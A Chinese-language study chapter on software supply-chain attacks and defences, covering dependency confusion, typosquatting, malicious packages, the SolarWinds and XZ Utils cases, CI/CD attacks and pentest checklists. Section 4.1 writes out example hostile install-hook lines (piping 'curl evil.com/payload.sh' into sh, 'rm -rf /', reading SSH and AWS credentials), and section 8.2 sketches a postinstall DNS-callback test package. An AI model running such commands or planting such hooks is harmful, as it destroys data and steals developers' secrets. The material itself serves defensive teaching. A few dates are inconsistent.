# 04. 供应链安全：依赖与构建生态的攻击面

> 领域：开发安全
> 关联：03-common-vulnerability-patterns.md（依赖信任假设是未经验证的信任）
> 学习路线：OS 内核 → 网络协议 → Web 安全 → C → Rust → 漏洞模式 → **供应链（当前）**

---

## 一、为什么供应链安全是现在最热的安全话题

### 1.1 背景：现代软件开发 >80% 是别人的代码

```
一个典型 Node.js 项目的依赖树:
  package.json → 20 个直接依赖
                    ↓
  node_modules → 1500+ 个间接依赖（计算）

  ≈ 5% 是团队自己写的代码
  ≈ 95% 是第三方代码（依赖）

如果任何一个依赖被恶意包替换 → 整个应用被攻破
```

### 1.2 供应链攻击的增长

```
2015年:  几个公开的 npm 恶意包
2019年:  event-stream 事件（感染 800 万个装机量）
2020年:  SolarWinds（最严重的供应链攻击，约18,000客户受影响）
2021年:  Alex Birsan 披露依赖混淆攻击（漏洞高达$130,000）
2023年:  npm/PyPI 上发现数千个恶意包
2024年:  XZ Utils 后门事件（差点植入 sshd！）
2025年:  Linux 内核出现后门尝试
```

**趋势很明显：攻击者的注意力转向了供应链。** 因为你不需要找 100 个漏洞——只要攻破一个依赖，就可以间接控制 10000 个应用。

---

## 二、依赖混淆 (Dependency Confusion)

### 2.1 原理

```
很多公司使用「私有包管理器」存储内部库。

举例:
  公司内部包: @company/internal-auth（npm）
  不在公共 npmjs.com 上存在

攻击者发现:
  1. 推测公司内部使用的包名（从 GitHub 泄露/错误信息/社交工程）
  2. 在公共 npm 上注册 @company/internal-auth（同样名字）
  3. 版本号设为 99.99.0（高于所有内部版本）
  4. 包中包含恶意代码（postinstall 脚本自动执行）

当公司的 CI/CD 运行 npm install:
  npm 检查公共注册表 → 找到 @company/internal-auth 99.99.0
  → 版本比内部的 1.0.0 更高
  → npm 安装公共的恶意版本！
```

### 2.2 Birsan 攻击（2021）

```
Alex Birsan 的思路:
  1. 他在不同公司发现泄露的内部包名
  2. 去公共注册表注册相同名字的包（带恶意 DNS 查询）
  3. 等待公司 CI/CD 执行 → 收到 DNS 请求（证明攻击成功）

成功对象: Apple, Microsoft, PayPal, Tesla, Yelp...
奖金: >$130,000（bug bounty）

关键原因:
  pip install 默认检查 PyPI（公共）→ 版本高的优先
  npm install 默认检查 npmjs（公共）→ 版本高的优先
  gem install 同理

如果内部包名在公共注册表中不存在
→ 攻击者可注册它 → 自动被拉取
```

### 2.3 语言特定机制

```
npm:
  默认: 从 npmjs.org 取包
  如果内部包名以 @scope/ 开头 → 可配置从私有源取
  但如果未配置 scope → 也查公共源

pip:
  --extra-index-url URL     → 私有源 + PyPI 都查
  --index-url URL           → 只查私有源（安全）
  但很多公司用了 --extra-index-url → 先查私有源，没找到就查 PyPI
  如果攻击者在 PyPI 发布了同名包 → 被拉取

maven:
  仓库顺序配置决定
  如果未配置私有仓库优先 → 从公共仓库拉取
```

### 2.4 防御

```
npm: 配置 scoped 包只从私有源取
  // .npmrc
  @mycompany:registry=https://private.registry.com
  // registry=https://registry.npmjs.org

pip: 使用 --index-url 而非 --extra-index-url
  pip install --index-url https://private.pypi.com/simple pkg
  // 这样只从私有源查，不查公共 PyPI

或者: 搭建代理镜像，只代理白名单的包
  私有源 → PyPI（需审核）
```

---

## 三、Typosquatting（打字错误劫持）

### 3.1 原理

```
注册和流行包名只差一个字符的恶意包:

  流行包名     恶意包名
  ──────────   ──────────
  requests     reqeusts、requestss、r3quests
  lodash       lodashs、lodas、l0dash
  urllib3      urlib3、urllib33
  express      expreess、expres、expre55
  jQuery       jqueryy、jQuery
  crypto       crypt0、cryptooo
  pip install  → pip insall（shell 别名劫持）

谁会输错?
  开发者在终端复制粘贴时
  在 package.json 中手动输入时
  在 Dockerfile 中写 pip install 时
```

### 3.2 案例

```
最著名的案例: ua-parser-js 劫持（2021）
  原包: ua-parser-js（每周 ~800 万下载）
  攻击者: 获得原作者的 npm 凭证 → 发布恶意更新
  恶意版本: 0.7.29, 0.8.0, 1.0.0
  恶意代码: 下载恶意软件 + 挖矿程序
  影响: 数百万应用程序（包括 Cloudflare 的 CDN）
  不是 typosquatting，但展示了供应链攻击的危害

PyPI typosquatting:
  dateutil → datetutil（58,000+ 次下载后被下架）
  urllib3_josecito 等
```

### 3.3 防御

```
1. 使用 lock 文件（package-lock.json / requirements.lock）
   → 固定确切的版本哈希，不因名字混淆
2. CI/CD 中自动扫描 typosquatting
   → 工具: Snync, GuardDog, Typosquatter 检测
3. 使用包管理器的安全功能
   → npm audit, pip-audit, `pip verify`
4. 使用代理源（只允许审核过的包）
5. 依赖审查
   → Dependabot, Renovate 自动检查依赖变更
```

---

## 四、恶意包和供应链投毒

### 4.1 恶意包的常见行为

```
安装时 (Preinstall/Postinstall):
  rm -rf /    ← 恶心人的
  curl evil.com/payload.sh | sh   ← 下载后门
  eval $(base64 -d <<<"...")      ← 内联编码的恶意代码
  fs.writeFileSync('/tmp/evil', ...)  ← 写文件

运行时:
  收集环境变量（包含 API Key 等敏感信息）
  读取 /etc/passwd, ~/.ssh/*, ~/.aws/*
  检查 CI/CD 环境 → 如果有 → 偷取 CI 凭证
  发送到 C2 服务器（DNS/SQLite/HTTP 方式外传）

隐藏方式:
  只在特定时间/IP 下激活（避开测试）
  包含完整的合法功能 + 隐藏后门
  代码混淆（变体名、字符串加密）
  只在一小部分安装中激活（避开检测）
```

### 4.2 SolarWinds (2020) — 最严重的供应链攻击

```
攻击类型: 构建环境投毒

过程:
  1. 攻击者攻破 SolarWinds 的构建系统
  2. 植入 SUNBURST 后门到 Orion 产品的源代码中
  3. Orion 产品正常构建 → 数字签名 → 分发
  4. 合法签名 → 更新包看起来完全正常
  5. 约 18,000 个客户安装了带后门的更新
  6. 后门在休眠 2 周后激活 → 连接 C2 服务器
  7. 攻击者选择高价值目标进行二次攻击
  8. 最终攻破: 美国政府机构、Fortune 500 公司

警觉: 攻击者侵入了构建系统，不是篡改依赖。
      他们让 SolarWinds "自己给自己投毒"。
      通过 SolarWinds 的数字签名 → 后门被认为是合法的 SolarWinds 软件。

攻击者水平: 极其高超。代码混淆 + 长时间潜伏 + 精准目标选择。
```

### 4.3 XZ Utils 后门 (2024) — 差点感染全球 SSH

```
攻击类型: 社区渗透 + 后门植入（社会工程学）

过程:
  1. 攻击者（Jia Tan）花 2 年时间融入 XZ 开源社区
  2. 逐渐获得信任 → 成为 XZ 的维护者
  3. 在 XZ 5.6.0/5.6.1 中植入复杂后门
  4. 后门: 修改 sshd 的认证流程，允许攻击者绕过认证
  5. 影响: 所有使用 systemd 的 Linux 发行版（包括 Debian/Ubuntu/Fedora）
  6. 还好: 后门在进入主流仓库前被发现（内部差异检测）

危险级别: 极高
  如果未被发现 → XZ 后门会潜入数十亿台 Linux 设备
  攻击者可以远程 root SSH 登录
```

### 4.4 如何检测恶意包

```
静态分析:
  - 检查 postinstall/preinstall 脚本
  - 检查 eval() / exec() / spawn() 调用
  - 检查 base64 / hex 编码的字符串
  - 检查可疑的网络请求

动态分析（沙箱）:
  - 在隔离环境中 install，监控文件/网络变化
  - 检查 DNS 请求、HTTP 外传
  - 检查文件系统修改

行为分析:
  - 包的使用量不匹配下载量（可能有恶意）
  - 包的行为在某个版本突然变化（可能是劫持）
  - 包的维护者最近变更（可能是账户被劫持）

工具:
  Socket.dev     → 实时分析 npm/PyPI 包行为
  npm audit      → 检查已知 CVE
  Snyk           → 依赖漏洞扫描
  GuardDog       → AI 检测恶意包
```

---

## 五、维护者账户劫持

### 5.1 原理

```
攻击者不创建新包 → 攻破已有维护者账户 → 在原包中植入恶意代码

优点（对攻击者来说）:
  - 原包有声望、有大量用户
  - 原包名已广为人知
  - 更新自动推送给所有用户
  - 安全审计通常只关注新包

攻击方式:
  - 钓鱼邮件（伪装成 npm/PyPI 官方）
  - 密码泄露（维护者用弱密码）
  - 2FA 绕过（SIM 交换、备份码泄露）
  - 社工（假装提交漏洞报告）
```

### 5.2 典型案例

```
event-stream (2018):
  攻击者: 获得维护者信任 → 成为共同维护者
  恶意: 添加 flatmap-stream 依赖 → 窃取比特币钱包
  影响: 800 万 + 下载（被嵌入多个流行工具）
  检测时间: ~3 个月

UA-Parser-JS (2021):
  攻击者: 窃取维护者的 npm token
  恶意: 版本 0.7.29/0.8.0/1.0.0 植入挖矿 + 恶意软件
  影响: 每周 ~800 万下载

PHP (2021):
  攻击者: 在 PHP Git 仓库中添加后门（冒充 Rasmus Lerdorf）
  恶意: 对 git push 的评论添加了后门代码
  还好: 提交被拒绝（开启了 signed commit 验证）
```

### 5.3 防御

```
对包维护者:
  - 启用 2FA（npm/PyPI/GitHub 都支持）
  - 不共享账户密码
  - 限制共同维护者权限
  - 使用硬件安全密钥（WebAuthn）

对使用者:
  - 锁定依赖版本（lock 文件）
  - 检查维护者的历史活动
  - 关注安全公告
  - 使用包签名验证
```

---

## 六、构建管道攻击

### 6.1 CI/CD 劫持

```
攻击 CI/CD 管道（比攻击代码更高效）:

  1. 获得 CI/CD 凭证 → 修改构建脚本
      → 在每次构建中添加恶意代码
      → 所有发布都被感染

  2. 修改 CI/CD 配置
      → 添加新的发布步骤（如 push 恶意 docker 镜像）
      → 删除安全检查步骤

  3. 利用 CI/CD 环境
      → CI/CD 通常有较访问更多资源
      → 攻击 CI/CD 可以触及生产环境
```

### 6.2 SLSA 框架

```
SLSA (Supply-chain Levels for Software Artifacts):
  定义供应链安全级别: SLSA 1-4

  SLSA 1: 构建过程记录
  SLSA 2: 防篡改的构建源
  SLSA 3: 可验证的隔离构建 + 无后门
  SLSA 4: 两方审查 + 可复现构建

目标: 确保构建产物是真的从源码构建的
      没有被中间人篡改
```

### 6.3 SBOM (Software Bill of Materials)

```
SBOM 是"软件物料清单"——列出所有组件的清单:

  组件名: lodash
  版本: 4.17.21
  许可证: MIT
  上游来源: npmjs.com
  依赖关系: 无
  校验和: sha256:abc123...

价值:
  - 知道"我们依赖什么"
  - 漏洞爆发时快速定位（如 Log4j）
  - 识别非法组件

问题:
  - SBOM 生成不标准
  - 很多团队没有维护 SBOM
  - 有 SBOM 但没有工具分析也没用
```

---

## 七、从原理推导攻击面

### 攻击面 1：信任包名称的唯一性

```
假设: 「包名在公共注册表中是唯一的」
  但：任何人都可以注册任何名字（只要不重复）

可推导攻击:
  依赖混淆就是利用了这个假设的漏洞
  攻击者注册不存在的内部包名 → 等待被拉取
```

### 攻击面 2：信任版本号递增

```
假设: 「版本高的包是更好的包」
  但：版本号没有安全意义

可推导攻击:
  依赖混淆用 99.99.0 的高版本号使包管理器选择恶意包
  版本号是纯元数据——与代码质量/安全性无关
```

### 攻击面 3：信任数字签名

```
假设: 「有签名的软件是安全的」
  但：SolarWinds 攻击证明了签名并不保证安全
      签名只证明代码来自某个构建过程
      不证明构建过程未被篡改

可推导攻击:
  攻破构建系统 → 以合法数字签名发布恶意代码
  用户看到 "Verified publisher" → 认为安全
```

### 攻击面 4：信任开源社区

```
假设: 「参与越久的人越值得信任」
  但：XZ 后门案例证明 2 年潜伏期足以获得信任

可推导攻击:
  攻击者进行"耐心"的社会工程攻击
  花时间参加社区、提交有用 PR、获得信任
  然后在关键时刻植入后门
```

### 攻击面 5：信任构建环境

```
假设: 「构建环境是安全的」
  但：CI/CD 通常从外部拉取大量依赖
      任何一个依赖被攻破 → 构建环境被控制 → 所有产出被污染

可推导攻击:
  不需要攻破源码仓库 → 攻破一个构建依赖就够了
  构建环境的权限通常较高 → 是攻击高价值的目标
```

---

## 八、渗透测试中的供应链检查

### 8.1 检查清单

```bash
# 1. package.json / pom.xml / requirements.txt
# 检查是否有 typosquatting（逐行检查包名）

# 2. lock 文件
# package-lock.json 是否存在？
# 是否使用固定版本？

# 3. postinstall 脚本
grep -r "postinstall" package.json
grep -r "preinstall\|postinstall\|install" node_modules/*/package.json

# 4. 检查 CI/CD 配置
# .github/workflows/*.yml
# Jenkinsfile / .gitlab-ci.yml
# 是否有安全检查？是否有未审查的第三方 action？

# 5. 检查私有包注册情况
npm search @company/
pip search company-package
# 是否已被恶意注册？（验证前先确认不触发依赖安装）

# 6. 检查依赖的已知 CVE
npm audit
pip-audit
safety check
```

### 8.2 依赖混淆的测试

```bash
# 思路: 在公共注册表上注册测试包
#       名字使用"公司名+常见内部包模式"
#       在 postinstall 发送 DNS 请求到自己的服务器
#       观察是否收到请求

# 示例（npm）:
# 1. 注册 @company/internal-auth-test
# 2. postinstall 中: require('dns').resolve('test.your-server.com')
# 3. 在 CI/CD 运行 npm install → 如果收到 DNS 请求 → 成功

# 注意: 这需要在授权的渗透测试框架中进行
# 不要在没有授权的情况下注册包
```

### 8.3 供应链攻击模拟

```bash
# 验证 CI/CD 管道是否安全
# 1. 检查 CI/CD 使用的 workspace/token 权限
# 2. 检查是否有第三方 action 无版本锁定
# 3. 检查依赖安装是否使用 --no-audit --no-optional 等安全选项

# npm 配置安全选项
npm config set audit true           # 安装时审计
npm config set fund false           # 禁止 funding 消息（减少攻击面）
npm install --ignore-scripts        # 不执行生命周期脚本
```

---

## 九、总结

### 供应链安全的核心洞察

```
现代软件开发 ≈ 95% 是别人的代码。
你的安全取决于你所有依赖的安全。
而你的依赖又取决于它们的依赖...

信任是分层的:
  信任包名 → 依赖混淆攻击
  信任版本号 → 恶意版本攻击
  信任维护者 → 账户劫持攻击
  信任构建环境 → 构建投毒攻击
  信任数字签名 → SolarWinds 式攻击

每个"信任"都是攻击面。
```

### 不同角色的防御重点

```
开发者:
  - 使用 lock 文件
  - 检查 postinstall 脚本
  - 最小化依赖
  - 安全配置包管理器

团队(/CI/CD):
  - 锁定 CI/CD 环境和依赖
  - 审查第三方 actions
  - SBOM 管理
  - 依赖扫描（npm audit, Snyk）

组织:
  - 私有包注册表
  - 依赖混淆防护策略
  - 安全开发培训
  - 应急响应计划
```

### 最重要的结论

> **供应链攻击不找你的代码漏洞——它找你的「信任关系」漏洞。**
> 
> 攻击者利用的是你"假设外部包是安全的"这个信任。
> 防御的关键是：**最小化信任、验证每个依赖、假设最坏情况。**
> 
> 对于渗透测试者：供应链测试的重点是找那些"公司依赖但未被监视"的入口——未注册的内部包名、未锁定的 CI/CD 动作、未被审查的第三方依赖。
